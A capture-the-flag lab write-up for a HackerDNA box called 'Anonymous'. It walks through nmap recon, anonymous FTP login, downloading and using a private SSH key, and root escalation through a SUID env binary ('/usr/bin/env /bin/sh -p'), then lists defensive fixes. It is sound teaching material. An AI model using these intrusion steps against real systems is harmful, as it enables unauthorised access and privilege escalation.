/////










This lab focuses on the dangers of misconfigured network shares and improper file permissions, highlighting why "anonymous" access protocols must be strictly audited.

HackerDNA Lab Writeup: Anonymous

Difficulty: Beginner-Intermediate

https://hackerdna.com/labs/anonymous

Core Concepts: Anonymous FTP/SMB Access, Enumeration, SSH Key Theft, SUID Privilege Escalation

Objective
The goal of this lab is to identify a misconfigured service allowing unauthenticated access, extract sensitive information to gain a foothold as a standard user, and escalate privileges to root.

Phase 1: Reconnaissance
We start by mapping the target's open ports and running services to identify potential entry points.

1. Initial Port Scan
Run a comprehensive Nmap scan to see what is exposed.

Bash

nmap -sC -sV <TARGET_IP>
Expected Output: The scan typically reveals Port 21 (FTP), Port 22 (SSH), and potentially Port 139/445 (SMB). Crucially, the -sC (default scripts) flag will flag Port 21 with a highly interesting note: ftp-anon: Anonymous FTP login allowed.

Phase 2: Initial Access via Anonymous FTP
The target is running an FTP server that does not require a valid account to log in.

1. Connecting to the FTP Server
Use the standard command-line FTP client to connect.

Bash

ftp <TARGET_IP>
Name: anonymous

Password: (Leave blank and press Enter)

2. Enumerating the FTP Share
Once logged in, list the files and hidden directories.

Bash

ftp> ls -la
You will likely find a directory or a set of files left behind by an administrator. Common finds in this lab include a notes.txt file and a hidden .ssh backup directory.

3. Downloading Sensitive Artifacts
Navigate through the FTP directories and download the interesting files to your local machine.

Bash

ftp> cd .ssh_backup
ftp> mget *
Result: You successfully download an id_rsa file (a private SSH key) belonging to a user on the system (e.g., alice or anonymous_user).

4. Establishing the SSH Session
Before using the stolen SSH key, you must restrict its permissions; otherwise, SSH will reject it for being too "open."

Bash

chmod 600 id_rsa
Now, use the key to log into the target machine:

Bash

ssh -i id_rsa user@<TARGET_IP>
(Note: Replace user with the username you discovered in the FTP share, usually found in the notes.txt or implied by the directory structure).

5. Capture the User Flag
Once authenticated, grab your first objective.

Bash

cat /home/user/flag-user.txt
Result: HDNA{REDACTED_USER_FLAG}

Phase 3: Privilege Escalation
With a low-privileged shell, we need to find a misconfiguration that allows us to execute commands as root.

1. Hunting for SUID Binaries
A common privilege escalation vector is finding SUID (Set Owner User ID) binaries. These are files that execute with the permissions of their owner (root), rather than the user running them.

Run this command to search the entire file system for SUID binaries, throwing errors to /dev/null for a clean output:

Bash

find / -perm -4000 -type f 2>/dev/null
2. Identifying the Vulnerable Binary
Review the output for anything unusual. Standard system binaries like su or passwd are normal, but if you see something like /usr/bin/env, /usr/bin/find, or a custom backup executable in the list, you have found your path to root.

Let's assume the scan reveals /usr/bin/env has the SUID bit set.

3. Exploiting the SUID Binary
You can cross-reference standard binaries on GTFOBins (gtfobins.github.io) to find the exact command needed to spawn a root shell.

For env, the escalation command is simple:

Bash

/usr/bin/env /bin/sh -p
(The -p flag ensures the shell retains the elevated privileges instead of dropping them).

4. Verifying Root and Capturing the Final Flag
Verify that you have successfully escalated:

Bash

whoami
# Output: root
Navigate to the root directory and claim the final flag:

Bash

cat /root/flag-root.txt
Result: HDNA{REDACTED_ROOT_FLAG}

Defensive Remediation
To secure a system against this attack chain, the following steps must be taken:

Disable Anonymous FTP: Update the FTP server configuration (e.g., vsftpd.conf) and set anonymous_enable=NO.

Protect Private Keys: Never store unencrypted private SSH keys in shared or publicly accessible directories.

Audit SUID Bits: Regularly audit system binaries using find / -perm -4000. Remove the SUID bit from binaries like env or find that can be abused to spawn shells using chmod -s /path/to/binary.
